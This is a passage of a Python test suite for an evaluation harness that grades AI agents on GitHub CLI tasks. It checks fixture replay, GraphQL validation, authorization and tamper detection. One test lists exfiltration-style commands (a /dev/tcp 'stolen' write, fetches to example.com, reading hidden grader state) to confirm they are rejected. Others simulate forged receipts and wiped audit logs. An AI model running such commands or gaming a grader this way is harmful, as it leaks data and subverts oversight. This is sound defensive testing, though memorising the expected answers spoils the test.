"""Credential-free production-path regression tests; no model performance claims."""

import copy
import importlib.util
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
import gh_evaluations as gh
import skill_reports as reports


class GhOfflineTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix="gh-tests-")
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)

    def workspace(self):
        root = self.root / "repo"
        shutil.copytree(gh.ROOT / gh.DEPLOYED, root / gh.DEPLOYED)
        shutil.copytree(
            gh.ROOT / ".agents/skills" / gh.COMPETING,
            root / ".agents/skills" / gh.COMPETING,
        )
        shutil.copytree(gh.ROOT / gh.OVERLAY, root / gh.OVERLAY)
        shutil.copyfile(gh.ROOT / "apm.lock.yaml", root / "apm.lock.yaml")
        return root

    def test_complete_offline_replay_and_injected_faults(self):
        result = gh.replay()
        self.assertEqual(result["good_passed"], 24)
        self.assertEqual(result["faults_rejected"], 13)

    def test_staging_preserves_upstream_and_excludes_provenance(self):
        source = (gh.ROOT / gh.DEPLOYED / "SKILL.md").read_bytes()
        staged = gh.stage(gh.ROOT, self.root / "bundle/gh", ["gh-002"])
        self.assertEqual((staged / "SKILL.md").read_bytes(), source)
        self.assertFalse((staged / "PROVENANCE.md").exists())
        data = reports.read_json(staged / "evals/evals.json")
        self.assertEqual([entry["id"] for entry in data["evals"]], ["gh-002"])
        self.assertNotIn("good_commands", data["evals"][0]["contract"])
        compile((staged / "evals/grader.py").read_text(), "grader.py", "exec")
        self.assertEqual((gh.ROOT / gh.DEPLOYED / "SKILL.md").read_bytes(), source)

    def test_ownership_hash_drift_rejected_before_staging(self):
        root = self.workspace()
        (root / gh.DEPLOYED / "SKILL.md").write_text("modified")
        with self.assertRaisesRegex(ValueError, "hash mismatch"):
            gh.stage(root, self.root / "bundle/gh")
        self.assertFalse((self.root / "bundle").exists())

    def test_owner_metadata_must_match_lock(self):
        import yaml

        root = self.workspace()
        lock = root / "apm.lock.yaml"
        data = yaml.safe_load(lock.read_text())
        next(
            d
            for d in data["deployments"]
            if d["value"] == str(gh.DEPLOYED / "SKILL.md")
        )["active_owner"] = "other/owner"
        lock.write_text(yaml.safe_dump(data))
        with self.assertRaisesRegex(ValueError, "owner mismatch"):
            gh.verify_skill(root)

    def test_symlinks_special_files_and_destination_escapes(self):
        root = self.workspace()
        fixture = root / gh.OVERLAY / "evals/files/bad"
        fixture.symlink_to("/dev/null")
        with self.assertRaises(ValueError):
            gh.stage(root, self.root / "bundle/gh")
        fixture.unlink()
        os.mkfifo(fixture)
        with self.assertRaises(ValueError):
            gh.stage(root, self.root / "bundle/gh")
        fixture.unlink()
        for target in (
            root / ".agents/skills/new",
            root / ".apm/skills/new",
            root / "local",
        ):
            with self.assertRaises(ValueError):
                gh.stage(root, target)
        (self.root / "link").symlink_to(self.root, target_is_directory=True)
        with self.assertRaises(ValueError):
            gh.stage(root, self.root / "link/bundle")

    def test_fixture_executable_supports_aliases_and_filtering(self):
        entry = copy.deepcopy(gh.dataset(selected=["gh-001"])[0])
        entry["contract"]["good_commands"] = [
            [
                "issue",
                "view",
                "12",
                "-R",
                "fixture-org/widget",
                "--json",
                "comments,title",
                "--jq",
                ".title",
            ]
        ]
        self.assertEqual(gh.replay_case(entry)["custom_metrics"]["gh_gate"], 1)

    def test_malformed_graphql_and_body_change_cannot_fabricate_success(self):
        entry = copy.deepcopy(gh.dataset(selected=["gh-003"])[0])
        entry["contract"]["good_commands"] = entry["contract"]["good_commands"][:2]
        self.assertEqual(gh.replay_case(entry)["custom_metrics"]["gh_gate"], 0)
        entry = copy.deepcopy(gh.dataset(selected=["gh-010"])[0])
        entry["contract"]["good_commands"][0] = [
            "pr", "comment", "17", "--repo", "fixture-org/widget", "--body", "wrong body",
        ]
        self.assertEqual(gh.replay_case(entry)["custom_metrics"]["gh_gate"], 0)

    def graphql_fixture(self):
        fixture = gh.module(gh.ROOT / gh.OVERLAY / "evals/files/fixture.py", "graphql_fixture")
        entry = copy.deepcopy(gh.dataset(selected=["gh-003"])[0])
        case = reports.read_json(gh.ROOT / gh.OVERLAY / "evals/files/cases/gh-003.json")
        return fixture, entry, case, entry["contract"]["good_commands"][-1]

    def test_modeled_graphql_variants_and_selection_projection(self):
        fixture, entry, case, command = self.graphql_fixture()
        query_index = next(i for i, value in enumerate(command) if value.startswith("query="))
        variants = [command,
            [value.replace("query=query(", "query=# mutation is only a comment\nquery Threads(").replace(
                "after:$endCursor", "after : $endCursor") for value in command],
            [value.replace("$endCursor:String)", "$endCursor:String,$number:Int!)").replace(
                "number:17", "number:$number") for value in command] + ["-F", "number=17"],
            [value.replace("$endCursor:String)", "$endCursor:String,$first:Int)").replace(
                "first:100", "first:$first") for value in command] + ["-F", "first=100"],
            [value.replace("$owner", "$org").replace("$name", "$repo").replace(
                "owner=fixture-org", "org=fixture-org").replace("name=widget", "repo=widget") for value in command],
        ]
        reordered = command.copy()
        reordered[query_index] = ('query=query Threads($name:String!, $endCursor:String, $owner:String!) { '
            'repository(name:$name owner:$owner) { pullRequest(number:17) { '
            'reviewThreads(after:$endCursor first:100) { pageInfo { endCursor hasNextPage } '
            'nodes { isResolved id } } } } }')
        variants.append(reordered)
        for args in variants:
            with self.subTest(command=args):
                value = fixture.dispatch(case, args, [])
                self.assertEqual(value["route"], "threads", value)
                pages = [json.loads(line) for line in value["stdout"].splitlines()]
                self.assertEqual([row["id"] for page in pages for row in
                    page["data"]["repository"]["pullRequest"]["reviewThreads"]["nodes"]], ["T1", "T2"])
                selected = copy.deepcopy(entry)
                selected["contract"]["good_commands"] = [args]
                self.assertEqual(gh.replay_case(selected)["custom_metrics"]["gh_gate"], 1)
        self.assertNotIn("comments", fixture.dispatch(case, reordered, [])["stdout"])

    def test_invalid_balanced_graphql_cannot_earn_task_or_recovery_credit(self):
        fixture, entry, case, command = self.graphql_fixture()
        changes = [
            ("query=query(", "query=query(???"),
            ("$owner:String!", "$owner:Int!"),
            ("$owner:String!", "$owner:String"),
            ("owner:$owner,", ""),
            ("number:17", "number:017"),
            ("number:17", 'number:"17"'),
            ("first:100", 'first:"100"'),
            ("query=query(", "query=query\u00a0("),
            ("query=query(", "query=query\v("),
            ("first:100", "first:2147483648"),
            ("hasNextPage endCursor", "hasNextPage(endCursor:true) endCursor"),
            ("isResolved comments", "isResolved{} comments"),
            ("query=query(", "query=query($unused:String,"),
            ("query=query(", "query=query($owner:String!,"),
        ]
        for before, after in changes:
            args = [value.replace(before, after) for value in command]
            with self.subTest(change=(before, after)):
                result = fixture.dispatch(case, args, [])
                self.assertNotEqual(result["exit_code"], 0)
                selected = copy.deepcopy(entry)
                selected["contract"]["good_commands"] = [args]
                metrics = gh.replay_case(selected)["custom_metrics"]
                self.assertEqual(metrics["gh_task"], 0)
                self.assertEqual(metrics["gh_recovery"], 0)
                self.assertEqual(metrics["gh_gate"], 0)
        for suffix in (" query { repository { issues { totalCount } } }", " junk"):
            args = [value + suffix if value.startswith("query=") else value for value in command]
            self.assertNotEqual(fixture.dispatch(case, args, [])["exit_code"], 0)
        huge = ["query=" + " " * 16385 if value.startswith("query=") else value for value in command]
        self.assertNotEqual(fixture.dispatch(case, huge, [])["exit_code"], 0)

    def test_graphql_unsupported_strategies_and_authorization_stay_closed(self):
        fixture, entry, case, command = self.graphql_fixture()
        variants = [
            [value.replace("query=query(", "query=mutation(") for value in command],
            [value.replace("pullRequest(number:17)", "pullRequest(number:18)") for value in command],
            [value.replace("repository(", "alias:repository(") for value in command],
            [value.replace("first:100", "first:50") for value in command],
            [value.replace("owner=fixture-org", "owner=fixture-fork") for value in command],
            command + ["--hostname", "example.invalid"],
            command + ["--field", "endCursor=C1"],
            command + ["--field", "owner=fixture-org"],
            [value.replace("owner=fixture-org", "owner=fixture-fork").replace("query=query(", "query=query(???")
             for value in command],
            [value.replace("$owner:String!", '$owner:String!="fixture-org"') for value in command],
            [value.replace("name:$name){", "name:$name)@skip(if:true){") for value in command],
            [value.replace("$owner:String!", "$owner:[String!]") for value in command],
        ]
        for args in variants:
            with self.subTest(command=args):
                self.assertNotEqual(fixture.dispatch(case, args, [])["exit_code"], 0)
                selected = copy.deepcopy(entry)
                selected["contract"]["good_commands"] = [args]
                self.assertEqual(gh.replay_case(selected)["custom_metrics"]["gh_authorization"], 0)
        typed = [value.replace("$endCursor:String)", "$endCursor:String,$number:Int!)").replace(
            "number:17", "number:$number") for value in command] + ["--raw-field", "number=17"]
        self.assertNotEqual(fixture.dispatch(case, typed, [])["exit_code"], 0)

    def test_graphql_slurp_pages_filters_and_invalid_flag_combinations(self):
        fixture, entry, case, command = self.graphql_fixture()
        raw = fixture.dispatch(case, command, [])["stdout"]
        slurped = fixture.dispatch(case, command + ["--slurp"], [])
        self.assertEqual(json.loads(slurped["stdout"]), [json.loads(line) for line in raw.splitlines()])
        self.assertEqual(len(json.loads(slurped["stdout"])), 2)
        filtered = fixture.dispatch(case, command + ["--jq", ".data.repository.pullRequest.reviewThreads.nodes[].id"], [])
        self.assertEqual(filtered["stdout"], "T1\nT2")
        for args in ([value for value in command if value != "--paginate"] + ["--slurp"],
                     command + ["--slurp", "--jq", "."]):
            self.assertNotEqual(fixture.dispatch(case, args, [])["exit_code"], 0)
        no_page = [value for value in command if value != "--paginate"]
        self.assertEqual(fixture.dispatch(case, no_page, [])["route"], "threads-first-page")
        selected = copy.deepcopy(entry)
        selected["contract"]["good_commands"] = [no_page]
        self.assertEqual(gh.replay_case(selected)["custom_metrics"]["gh_task"], 0)

    def test_rest_slurp_wraps_pages_and_jq_filters_each_page(self):
        fixture, _, _, _ = self.graphql_fixture()
        entry = gh.dataset(selected=["gh-007"])[0]
        case = reports.read_json(gh.ROOT / gh.OVERLAY / "evals/files/cases/gh-007.json")
        command = entry["contract"]["good_commands"][0]
        filtered = fixture.dispatch(case, command, [])
        self.assertEqual([json.loads(line) for line in filtered["stdout"].splitlines()], [list(range(1, 31)), [31]])
        raw_command = command[:command.index("--jq")]
        raw = fixture.dispatch(case, raw_command, [])
        slurp = fixture.dispatch(case, raw_command + ["--slurp"], [])
        self.assertEqual(json.loads(slurp["stdout"]), [json.loads(line) for line in raw["stdout"].splitlines()])
        self.assertIn("pull_request", json.loads(slurp["stdout"])[1][-1])
        self.assertNotEqual(fixture.dispatch(case, command + ["--slurp"], [])["exit_code"], 0)

    def test_fixture_contract_changes_have_distinct_dataset_and_policy_identities(self):
        import skill_evidence as evidence
        root = self.workspace()
        path = root / gh.OVERLAY / "evals/evals.json"
        current = path.read_bytes()
        data = json.loads(current)
        for entry in data["evals"]:
            entry["contract"].pop("fixture_contract")
        path.write_text(json.dumps(data))
        self.assertNotEqual(evidence.digest_bytes(current), evidence.digest_bytes(path.read_bytes()))
        with self.assertRaisesRegex(ValueError, "Unsupported gh fixture contract"):
            gh.stage(root, self.root / "old-contract/gh")
        self.assertFalse((self.root / "old-contract").exists())
        policy = reports.benchmark_policy("gh")
        self.assertEqual(policy["deterministic_gate"], 3)
        old = {**policy, "deterministic_gate": 2}
        self.assertNotEqual(evidence.make_policy(policy, provenance="runtime_recorded")["id"],
                            evidence.make_policy(old, provenance="runtime_recorded")["id"])

    def test_pending_checks_require_fresh_head_observation(self):
        entry = copy.deepcopy(gh.dataset(selected=["gh-006-pending"])[0])
        entry["contract"]["good_commands"].pop()
        self.assertEqual(gh.replay_case(entry)["custom_metrics"]["gh_gate"], 0)

    def test_watch_run_is_discovered_from_checks_observation(self):
        for identity in ("gh-006-pending", "gh-006-changed-head"):
            entry = gh.dataset(selected=[identity])[0]
            case = reports.read_json(gh.ROOT / gh.OVERLAY / entry["files"][-1])
            command = entry["contract"]["good_commands"][1]
            self.assertIn("link", command[command.index("--json") + 1].split(","))
            response = next(r for r in case["routes"] if r["match"]["pos"][:2] == ["pr", "checks"])["responses"][0]
            links = [check["link"] for check in json.loads(response["stdout"])]
            self.assertTrue(any("/actions/runs/71" in link for link in links))

    def test_issue_collection_models_all_states_and_filters_pull_requests(self):
        entry = gh.dataset(selected=["gh-007"])[0]
        command = entry["contract"]["good_commands"][0]
        self.assertEqual(command[command.index("--method") + 1], "GET")
        self.assertIn("state=all", command)
        self.assertIn("--paginate", command)
        self.assertIn("pull_request", command[command.index("--jq") + 1])
        case = reports.read_json(gh.ROOT / gh.OVERLAY / entry["files"][-1])
        items = [item for page in case["routes"][0]["responses"][0]["stdout"].splitlines() for item in json.loads(page)]
        self.assertNotIn("--slurp", command)  # gh rejects --slurp combined with --jq.
        self.assertTrue(any(item.get("state") == "closed" for item in items))
        self.assertTrue(any("pull_request" in item for item in items))
        self.assertEqual(gh.replay_case(entry)["custom_metrics"]["gh_gate"], 1)

    def test_authorization_rejects_unmodeled_completed_calls(self):
        entry = gh.dataset(selected=["gh-001"])[0]
        for command in (
            "python3 -c 'import urllib.request; urllib.request.urlopen(\"https://example.com\")'",
            "node -e 'fetch(\"https://example.com\")'",
            "bash -c 'echo stolen > /dev/tcp/example.com/80'",
            "gh issue view 12 --repo fixture-org/widget --json title,comments; true",
            "cat /opt/gh-eval/state/case.json",
            "env gh issue view 12 --repo fixture-org/widget --json title,comments",
        ):
            with self.subTest(command=command):
                call = {"action": "exec_command", "action_input": {"cmd": command}, "observation": "completed"}
                reward = gh.replay_case(entry, extra_calls=[call])
                self.assertEqual(reward["custom_metrics"]["gh_authorization"], 0)
        for call in (
            {"action": "unknown", "action_input": {}, "observation": "completed"},
            {"action": "exec_command", "action_input": {"cmd": "git status --porcelain"}},
            {"action": "exec_command", "action_input": {"cmd": "git status --porcelain"}, "observation": "", "normalization_status": "unobserved_inner_call"},
        ):
            self.assertEqual(gh.replay_case(entry, extra_calls=[call])["custom_metrics"]["gh_authorization"], 0)

    def test_authorization_accepts_public_reads_and_literal_json_result_write(self):
        import shlex

        entry = gh.dataset(selected=["gh-001"])[0]
        commands = ["cat AGENTS.md", "pwd", "ls -la", "printf '%s\\n' " + shlex.quote(json.dumps(entry["contract"]["expected"])) + " > output/result.json"]
        calls = [{"action": "exec_command", "action_input": {"cmd": command}, "observation": ""} for command in commands]
        self.assertEqual(gh.replay_case(entry, extra_calls=calls)["custom_metrics"]["gh_gate"], 1)

    def test_preinstall_selection_needs_only_python_standard_library(self):
        result = subprocess.run(
            [
                sys.executable,
                "-S",
                str(gh.ROOT / ".github/scripts/skill_reports.py"),
                "select",
                "gh",
                "standard",
            ],
            capture_output=True,
            text=True,
            env={
                **os.environ,
                "GITHUB_WORKSPACE": str(gh.ROOT),
                "GITHUB_OUTPUT": str(self.root / "selection"),
            },
        )
        self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
        self.assertIn("attempts=1", (self.root / "selection").read_text())

    def test_authored_cases_and_smoke_policy(self):
        entries = gh.dataset(selected=gh.SMOKE)
        self.assertEqual(len(entries) * reports.MODES["standard"] * 2, 8)
        self.assertEqual(len(gh.dataset()) * reports.MODES["confirmation"] * 2, 144)
        command = gh.native_command(
            Path("/tmp/bundle/gh"), "standard", Path("/tmp/results")
        )
        self.assertIn("default_plus_custom", command)
        self.assertNotIn("--skip-baseline", command)
        self.assertNotIn("--stop-on-pass", command)
        self.assertEqual(reports.benchmark_policy("podman"), reports.POLICY)
        self.assertEqual(
            reports.benchmark_skill(gh.ROOT, "podman"), gh.ROOT / ".apm/skills/podman"
        )
        with self.assertRaises(ValueError):
            gh.dataset(selected=["../podman"])

    def rewards(self):
        for arm in ("with-skill", "without-skill"):
            metrics = {
                "gh_" + k: 1.0
                for k in (
                    "evidence",
                    "activation",
                    "commands",
                    "task",
                    "recovery",
                    "authorization",
                    "efficiency",
                    "gate",
                )
            }
            if arm == "without-skill":
                metrics.update(gh_activation=0.0, gh_gate=0.0)
            reports.write_json(
                self.root / "run/codex" / arm / "trials/one/reward.json",
                {"entry_id": "gh-001", "custom_metrics": metrics},
            )
        return self.root / "run"

    def test_gate_does_not_promote_native_scores_over_failed_assertions(self):
        run = self.rewards()
        self.assertEqual(len(gh.deterministic_gate(run, ["gh-001"], 1)), 2)
        path = run / "codex/with-skill/trials/one/reward.json"
        data = reports.read_json(path)
        data["overall"] = 1
        data["custom_metrics"]["gh_authorization"] = 0
        reports.write_json(path, data)
        with self.assertRaises(ValueError):
            gh.deterministic_gate(run, ["gh-001"], 1)
        data["custom_metrics"]["gh_gate"] = 0
        reports.write_json(path, data)
        with self.assertRaises(ValueError):
            gh.deterministic_gate(run, ["gh-001"], 1)

    def test_gate_rejects_missing_baseline_duplicate_cases_and_unknown_ids(self):
        run = self.rewards()
        with self.assertRaises(ValueError):
            gh.deterministic_gate(run, ["gh-001", "gh-002"], 1)
        with self.assertRaises(ValueError):
            gh.deterministic_gate(run, ["gh-002"], 1)
        (run / "codex/without-skill/trials/one/reward.json").unlink()
        with self.assertRaises(ValueError):
            gh.deterministic_gate(run, ["gh-001"], 1)

    def test_live_interface_is_explicit_get_only_and_never_logs_payload(self):
        with patch.object(gh.subprocess, "run") as run:
            run.side_effect = [
                subprocess.CompletedProcess(
                    [],
                    0,
                    json.dumps({"private": False, "full_name": "public/example"}),
                    "",
                ),
                subprocess.CompletedProcess([], 0, "[]", ""),
            ]
            gh.live("public/example")
            for call in run.call_args_list:
                command = call.args[0]
                self.assertEqual(command[:2], ["gh", "api"])
                self.assertEqual(command[command.index("--method") + 1], "GET")
            self.assertEqual(run.call_count, 2)
        with self.assertRaises(ValueError):
            gh.live("--help")

    def test_real_cli_help_contract_when_installed(self):
        if not shutil.which("gh"):
            self.skipTest("real gh CLI not installed")
        commands = {
            ("api",): ["--method", "--paginate", "--slurp", "--raw-field", "--field"],
            ("issue", "view"): ["--json", "--comments", "--repo"],
            ("pr", "checks"): ["--json", "--interval"],
            ("run", "view"): ["--log-failed"],
            ("search", "prs"): ["--app", "--limit"],
            ("pr", "comment"): ["--body-file", "--attach"],
        }
        version = subprocess.check_output(["gh", "--version"], text=True)
        if "2.102.0" not in version:
            self.skipTest("help contract recorded for gh 2.102.0")
        for command, flags in commands.items():
            help_text = subprocess.check_output(["gh", *command, "--help"], text=True)
            for flag in flags:
                self.assertIn(flag, help_text)


@unittest.skipUnless(
    importlib.util.find_spec("skillevaluator") and importlib.util.find_spec("pydantic"),
    "pinned SkillEvaluator environment unavailable",
)
class GhNativeTests(unittest.TestCase):
    def test_graphql_production_verifier_both_arms_and_receipt_tampering(self):
        import shlex
        from skillevaluator.tier3.harbor.adapter import stage_native_harbor_tasks

        with tempfile.TemporaryDirectory(prefix="gh-graphql-verifier-") as temporary:
            root = Path(temporary)
            skill = gh.stage(gh.ROOT, root / "bundle/gh", ["gh-003"])
            original = gh.dataset(selected=["gh-003"])[0]
            for with_skill in (True, False):
                task = stage_native_harbor_tasks(skill, root / str(with_skill), with_skill=with_skill,
                    grading_mode="default_plus_custom", workspace_mode="group",
                    workspace_skill_paths=[skill.parent / gh.COMPETING])[0]
                for variant in ("slurp", "invalid", "receipt", "audit", "old-contract"):
                    with self.subTest(arm=with_skill, variant=variant):
                        workspace = root / f"workspace-{with_skill}-{variant}"
                        workspace.mkdir()
                        shutil.copytree(task / "environment/private", workspace / "input")
                        shutil.copytree(task / "environment/skills", workspace / "skills")
                        setup = gh.module(gh.ROOT / gh.OVERLAY / "evals/files/setup.py", "setup")
                        env = setup.setup(workspace, workspace / "input")
                        broker = setup.start_broker(workspace / ".gh-fixture", workspace / "broker/gh.sock")
                        env["GH_FIXTURE_SOCKET"] = str(workspace / "broker/gh.sock")
                        steps = []

                        def observed(command):
                            result = subprocess.run(["/bin/sh", "-c", command], cwd=workspace,
                                env=env, capture_output=True, text=True, timeout=5)
                            identity = str(len(steps))
                            steps.append({"source": "agent", "tool_calls": [{"tool_call_id": identity,
                                "function_name": "bash", "arguments": {"command": command}}],
                                "observation": {"results": [{"source_call_id": identity,
                                    "content": result.stdout + result.stderr}]}})
                            return result

                        try:
                            if with_skill:
                                self.assertEqual(observed("cat skills/gh/SKILL.md").returncode, 0)
                            args = original["contract"]["good_commands"][-1] + ["--slurp"]
                            if variant == "invalid":
                                args = [value.replace("query=query(", "query=query(???") for value in args]
                            result = observed(shlex.join(["gh", *args]))
                            self.assertEqual(result.returncode == 0, variant != "invalid")
                            if variant == "slurp":
                                self.assertEqual(len(json.loads(result.stdout)), 2)
                            if variant == "receipt":
                                part = steps[-1]["observation"]["results"][0]
                                part["content"] = part["content"].split("GH_FIXTURE_RECEIPT=")[0] + "GH_FIXTURE_RECEIPT=" + "0" * 64
                            observed("printf '%s\\n' " + shlex.quote(json.dumps(original["contract"]["expected"]))
                                     + " > output/result.json")
                        finally:
                            broker.terminate()
                            broker.wait(timeout=5)
                        if variant == "audit":
                            (workspace / ".gh-fixture/audit.jsonl").write_text("")
                        entry = reports.read_json(task / "tests/entry.json")
                        if variant == "old-contract":
                            entry["contract"].pop("fixture_contract")
                        entry_path = workspace / "entry.json"
                        reports.write_json(entry_path, entry)
                        trajectory = workspace / "trajectory.json"
                        reports.write_json(trajectory, {"steps": steps})
                        reward = workspace / "reward.json"
                        completed = subprocess.run([sys.executable, "-B", str(task / "tests/grader.py")],
                            capture_output=True, text=True, timeout=15, env={
                                "PATH": os.environ["PATH"], "PYTHONDONTWRITEBYTECODE": "1",
                                "HARBOR_TESTS_DIR": str(task / "tests"), "HARBOR_ENTRY_JSON": str(entry_path),
                                "HARBOR_ATIF_PATH": str(trajectory), "HARBOR_WORKSPACE": str(workspace),
                                "HARBOR_REWARD_JSON": str(reward), "HARBOR_REWARD_TXT": str(workspace / "reward.txt"),
                            })
                        self.assertEqual(completed.returncode, 0, completed.stderr)
                        metrics = reports.read_json(reward)["custom_metrics"]
                        self.assertEqual(metrics["gh_activation"], float(with_skill))
                        self.assertEqual(metrics["gh_gate"], float(with_skill and variant == "slurp"))
                        if variant == "slurp":
                            self.assertTrue(all(metrics["gh_" + dimension] == 1 for dimension in
                                ("evidence", "commands", "task", "recovery", "authorization", "efficiency")))
                        else:
                            self.assertEqual(metrics["gh_task"], 0)
                            self.assertEqual(metrics["gh_recovery"], 0)
                            if variant != "invalid":
                                self.assertEqual(metrics["gh_evidence"], 0)

    def test_native_adapter_preserves_pinned_build_inputs_in_both_arms(self):
        from skillevaluator.tier3.harbor.adapter import stage_native_harbor_tasks

        image = "python:3.12-slim-trixie@sha256:a6e34c598f2467ed0e9a8d349809fcd8b5c603269512df273a0bb1784edc11b1"
        packages = {
            "git": "1:2.47.3-0+deb13u1",
            "jq": "1.7.1-6+deb13u4",
            "nodejs": "20.19.2+dfsg-1+deb13u3",
            "npm": "9.2.0~ds1-3",
            "ca-certificates": "20250419",
        }
        snapshot = "20261010T000000Z"
        with tempfile.TemporaryDirectory(prefix="gh-build-pins-") as temporary:
            root = Path(temporary)
            skill = gh.stage(gh.ROOT, root / "bundle/gh", ["gh-001"])
            for with_skill in (True, False):
                with self.subTest(with_skill=with_skill):
                    task = stage_native_harbor_tasks(
                        skill, root / str(with_skill), with_skill=with_skill,
                        grading_mode="default_plus_custom", workspace_mode="group",
                        workspace_skill_paths=[skill.parent / gh.COMPETING],
                    )[0]
                    dockerfile = (task / "environment/Dockerfile").read_text()
                    self.assertEqual(dockerfile.splitlines()[0], "FROM " + image)
                    for archive, suite in (("debian", "trixie"), ("debian-security", "trixie-security")):
                        self.assertIn(
                            "deb [check-valid-until=no signed-by=/usr/share/keyrings/debian-archive-keyring.gpg] "
                            f"https://snapshot.debian.org/archive/{archive}/{snapshot}/ {suite} main",
                            dockerfile,
                        )
                    self.assertIn("rm -f /etc/apt/sources.list.d/*", dockerfile)
                    self.assertIn("> /etc/apt/sources.list", dockerfile)
                    self.assertIn("apt-get update --error-on=any", dockerfile)
                    for package, version in packages.items():
                        self.assertIn(package + "=" + version, dockerfile)
                    for forbidden in ("deb.debian.org", "security.debian.org", "trixie-updates",
                                      "trusted=yes", "--allow-unauthenticated", "Acquire::Check-Valid-Until"):
                        self.assertNotIn(forbidden, dockerfile)
        self.assertEqual(reports.benchmark_policy("gh")["task_build"], {
            "base_image": image, "apt_snapshot": snapshot, "apt_packages": packages,
        })

    def test_native_task_generation_both_arms_and_hidden_verifier_contract(self):
        from skillevaluator.tier3.harbor.adapter import stage_native_harbor_tasks

        with tempfile.TemporaryDirectory(prefix="gh-native-") as tmp:
            root = Path(tmp)
            skill = gh.stage(gh.ROOT, root / "bundle/gh", list(gh.SMOKE))
            arms = []
            for with_skill in (True, False):
                tasks = stage_native_harbor_tasks(
                    skill,
                    root / str(with_skill),
                    with_skill=with_skill,
                    grading_mode="default_plus_custom",
                    workspace_mode="group",
                    workspace_skill_paths=[skill.parent / gh.COMPETING],
                )
                self.assertEqual(len(tasks), 4)
                arms.append(tasks)
                for task in tasks:
                    import tomllib
                    config = tomllib.loads((task / "task.toml").read_text())
                    self.assertEqual(config["agent"]["user"], "agent")
                    self.assertEqual(config["verifier"]["user"], "root")
                    self.assertTrue((task / "environment/private/cases" / (task.name + ".json")).is_file())
                    self.assertTrue((task / "tests/grader.py").is_file())
                    visible_skills = {
                        p.parent.name for p in (task / "environment").rglob("SKILL.md")
                    }
                    self.assertIn(gh.COMPETING, visible_skills)
                    self.assertEqual("gh" in visible_skills, with_skill)
                    self.assertIn(
                        "custom_grader_runner.py", (task / "tests/test.sh").read_text()
                    )
                    self.assertNotIn("contract", (task / "instruction.md").read_text())
                    entry = reports.read_json(task / "tests/entry.json")
                    self.assertEqual(entry["has_skill"], with_skill)
                    self.assertIn("fixture_case", entry["contract"])
                    visible = "\n".join(
                        p.read_text()
                        for p in (task / "environment/input").rglob("*")
                        if p.is_file()
                    )
                    self.assertFalse((task / "environment/input/cases").exists())
                    self.assertNotIn("good_commands", visible)
                    self.assertNotIn("required_routes", visible)
            for left, right in zip(*arms):
                self.assertEqual(
                    (left / "instruction.md").read_bytes(),
                    (right / "instruction.md").read_bytes(),
                )
                for source in (left / "environment/input").rglob("*"):
                    if source.is_file():
                        self.assertEqual(
                            source.read_bytes(),
                            (
                                right
                                / "environment/input"
                                / source.relative_to(left / "environment/input")
                            ).read_bytes(),
                        )

    def test_production_grader_uses_native_completed_calls_and_propagates_failure(self):
        from skillevaluator.tier3.harbor.adapter import stage_native_harbor_tasks
        import shlex

        with tempfile.TemporaryDirectory(prefix="gh-grading-") as temporary:
            root = Path(temporary)
            skill = gh.stage(gh.ROOT, root / "bundle/gh", ["gh-001"])
            task = stage_native_harbor_tasks(
                skill, root / "tasks", grading_mode="default_plus_custom"
            )[0]
            workspace = root / "workspace"
            workspace.mkdir()
            shutil.copytree(task / "environment/private", workspace / "input")
            shutil.copytree(task / "environment/skills", workspace / "skills")
            setup = gh.module(gh.ROOT / gh.OVERLAY / "evals/files/setup.py", "setup")
            environment = setup.setup(workspace, workspace / "input")
            broker = setup.start_broker(workspace / ".gh-fixture", workspace / "broker/gh.sock")
            self.addCleanup(broker.wait, timeout=5)
            self.addCleanup(broker.terminate)
            environment["GH_FIXTURE_SOCKET"] = str(workspace / "broker/gh.sock")
            original = gh.dataset(selected=["gh-001"])[0]
            args = original["contract"]["good_commands"][0]
            result = subprocess.run(
                ["gh", *args],
                cwd=workspace,
                env=environment,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            steps = [
                {
                    "source": "agent",
                    "tool_calls": [
                        {
                            "tool_call_id": "read",
                            "function_name": "bash",
                            "arguments": {
                                "command": "cat /workspace/skills/gh/SKILL.md"
                            },
                        }
                    ],
                    "observation": {
                        "results": [
                            {
                                "source_call_id": "read",
                                "content": (skill / "SKILL.md").read_text(),
                            }
                        ]
                    },
                },
                {
                    "source": "agent",
                    "tool_calls": [
                        {
                            "tool_call_id": "command",
                            "function_name": "bash",
                            "arguments": {"command": shlex.join(["gh", *args])},
                        }
                    ],
                    "observation": {
                        "results": [
                            {
                                "source_call_id": "command",
                                "content": result.stdout + result.stderr,
                            }
                        ]
                    },
                },
            ]
            logs = root / "logs"
            (logs / "verifier").mkdir(parents=True)
            reports.write_json(logs / "agent/trajectory.json", {"steps": steps})
            reports.write_json(
                workspace / "output/result.json", original["contract"]["expected"]
            )
            environment.update(
                HARBOR_WORKSPACE=str(workspace),
                HARBOR_TESTS_DIR=str(task / "tests"),
                HARBOR_LOGS_DIR=str(logs),
                HARBOR_ATIF_PATH=str(logs / "agent/trajectory.json"),
                HARBOR_ENTRY_JSON=str(task / "tests/entry.json"),
                HARBOR_GRADER=str(task / "tests/grader.py"),
                HARBOR_REWARD_JSON=str(logs / "verifier/reward.json"),
                HARBOR_REWARD_TXT=str(logs / "verifier/reward.txt"),
            )
            for tamper in (False, True):
                if tamper:
                    (workspace / ".gh-fixture/audit.jsonl").write_text("")
                reports.write_json(
                    logs / "verifier/reward.json", {"overall": 1.0, "accuracy": 1.0}
                )
                reports.write_json(
                    logs / "verifier/skill_evaluator_reward.json",
                    {"overall": 1.0, "accuracy": 1.0},
                )
                completed = subprocess.run(
                    [
                        sys.executable,
                        str(task / "tests/custom_grader_runner.py"),
                        "--mode",
                        "default_plus_custom",
                    ],
                    env=environment,
                    capture_output=True,
                    text=True,
                )
                self.assertEqual(completed.returncode, 0, completed.stderr)
                reward = reports.read_json(logs / "verifier/custom_reward.json")
                self.assertEqual(
                    reward["custom_metrics"]["gh_gate"], float(not tamper), reward
                )
                self.assertEqual(reward["custom_metrics"]["gh_activation"], 1.0)

    def test_selected_recovery_preserves_ids_and_never_publishes_history(self):
        with tempfile.TemporaryDirectory(prefix="gh-recovery-") as temporary:
            root = Path(temporary)
            gh.stage(gh.ROOT, root / "bundle/gh", ["gh-002", "gh-005"])
            run = root / "results/gh/interrupted"
            (run / "_harbor-jobs").mkdir(parents=True)
